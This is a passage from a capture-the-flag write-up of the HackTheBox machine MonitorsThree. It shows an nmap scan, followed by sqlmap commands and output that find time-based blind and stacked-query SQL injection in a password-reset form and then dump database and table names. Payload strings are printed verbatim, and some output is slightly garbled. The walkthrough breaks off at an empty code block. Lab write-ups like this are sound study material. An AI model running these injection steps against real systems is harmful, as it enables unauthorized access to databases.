---
title: MonitorsThree
tags:
  - HackTheBox
  - Medium
  - Linux
  - SQLi
---
![](Pasted%20image%2020240904220155.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.30 monitorsthree.htb" | sudo tee -a /etc/hosts
```

First I performed a Nmap scan:

```shell
nmap -sC -T4 -p- monitorsthree.htb > sC.txt

[redacted]
PORT     STATE    SERVICE
22/tcp   open     ssh
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp   open     http
|_http-title: MonitorsThree - Networking Solutions
8084/tcp filtered websnp
```

I decided to take a look at the webpage:

![](Pasted%20image%2020240904221116.png)

After inspecting the source code, I didn't find anything, so I took a look at the login page:

![](Pasted%20image%2020240904221352.png)

Let's capture the request to `admin:admin` and pass it to [Sqlmap 🪲](/notes/tools/Sqlmap.md):

```shell
sqlmap -r req.txt -p ' username' --level=5 --risk=3 --batch --dbs
```

Unfortunately, it didn't work. So let's try the same at the `forgot_password.php`:

![](Pasted%20image%2020240904223927.png)

```shell
sqlmap -r req.txt --level=5 --risk=3 --batch --dbs --dump

[redacted]
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 2253 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: username=a';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=a' AND (SELECT 2135 FROM (SELECT(SLEEP(5)))iKyK)-- IvUB
```

> *Bingo!*

It seems that the account recovery page is vulnerable to **time-base blind sql injection**:

```shell
[redacted]

available databases [2]:
[*] `monitorsthree_d\x81`
[*] information_schema
```

So I inspected `monitorsthree_db`:

```shell
sqlmap -r req.txt --level=5 --risk=3 --batch -D monitorsthree_db --tables --dump

[redacted]
Database: monitorsthree_db
[6 tables]
+---------------+
| uers         |
| changelog     |
| customers     |
| invoice_tasks |
| invoices      |
| tasks         |
+---------------+
```

Let's check `users`:

```shell
```

